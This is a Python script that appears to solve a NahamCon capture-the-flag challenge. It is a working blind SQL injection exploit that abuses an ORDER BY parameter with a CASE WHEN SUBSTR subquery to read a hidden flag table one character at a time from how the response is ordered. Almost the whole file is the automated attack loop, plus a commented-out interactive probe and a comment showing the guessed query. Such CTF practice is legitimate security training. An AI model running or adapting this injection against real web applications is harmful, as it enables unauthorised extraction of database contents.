import readline
import requests as rq
from string import ascii_lowercase 

url = 'http://challenge.nahamcon.com:30685/'


def sqli(search, order):
    data = {'search': search, 'order': order}
    res = rq.post(url, data)
    # print(res.text)
    return res.text


def isTrue(res):
    return res.find('90') < res.find('116')


def get_flag():
    flag = 'flag{order_by'
    for _ in range(64):
        for c in ascii_lowercase+'_}':
            search = 'orium'
            order = f'(CASE WHEN SUBSTR((SELECT flag FROM flag),{len(flag)+1},1)=="{c}" THEN atomic_number ELSE symbol END)'
            res = sqli(search, order)
            if isTrue(res):
                flag += c
                print(f'Flag: {flag}')
                break
    return flag


get_flag()

'''
while True:
    print(ascii_letters+'_')
    search = input('search: ')
    search = search if search else ''
    order = input('order: ')
    sqli(search, order)
'''

# SELECT a,b,c from metals WHERE name LIKE '%<search>%' ORDER BY <order>
